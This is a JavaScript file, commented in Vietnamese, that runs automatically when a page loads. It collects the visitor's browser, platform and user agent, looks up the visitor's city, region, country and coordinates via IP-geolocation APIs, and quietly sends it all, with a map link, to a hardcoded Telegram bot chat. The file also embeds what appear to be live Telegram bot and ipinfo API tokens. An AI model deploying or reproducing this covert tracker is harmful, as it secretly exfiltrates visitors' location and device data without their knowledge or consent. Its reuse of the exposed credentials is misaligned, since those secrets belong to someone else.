const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn


// Hàm lấy thông tin trình duyệt & thiết bị
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = "Không xác định";

    if (userAgent.includes("Chrome")) browser = "Google Chrome";
    if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
    if (userAgent.includes("Edg")) browser = "Microsoft Edge";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) browser = "Opera";

    return {
        userAgent: userAgent,
        browser: browser,
        platform: navigator.platform
    };
}

// Hàm lấy vị trí & gửi đến Telegram
async function sendInfoToTelegram() {
    const deviceInfo = getDeviceInfo();
    let city = "Không xác định";
    let region = "Không xác định";
    let country = "Không xác định";
    let latitude = "Không xác định";
    let longitude = "Không xác định";

    try {
        // Gọi API ipinfo.io để lấy thông tin địa lý
        let response = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf");
        let data = await response.json();
        
        if (data.city) city = data.city;
        if (data.region) region = data.region;
        if (data.country) country = data.country;

        // Lấy tọa độ từ ipinfo.io nếu có
        if (data.loc) {
            [latitude, longitude] = data.loc.split(",");
        }
    } catch (error) {
        console.log("Lỗi API ipinfo.io, thử API khác...");

        // Nếu ipinfo.io lỗi, thử gọi API từ ip-api.com
        try {
            let fallbackResponse = await fetch("http://ip-api.com/json/");
            let fallbackData = await fallbackResponse.json();

            if (fallbackData.city) city = fallbackData.city;
            if (fallbackData.regionName) region = fallbackData.regionName;
            if (fallbackData.country) country = fallbackData.country;
            if (fallbackData.lat) latitude = fallbackData.lat;
            if (fallbackData.lon) longitude = fallbackData.lon;
        } catch (fallbackError) {
            console.log("Không thể lấy vị trí từ API dự phòng.");
        }
    }

    // Gửi tin nhắn đến Telegram
    const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const message = `
🔍 **THÔNG TIN TRUY CẬP**
🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
🏙️ Thành phố: ${city}
🏛️ Tỉnh/Bang: ${region}
🌏 Quốc gia: ${country}
💻 Hệ điều hành: ${deviceInfo.platform}
🌐 Trình duyệt: ${deviceInfo.browser}
🖥️ User-Agent: ${deviceInfo.userAgent}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });
}

// Gọi hàm gửi thông tin khi trang được tải
sendInfoToTelegram();
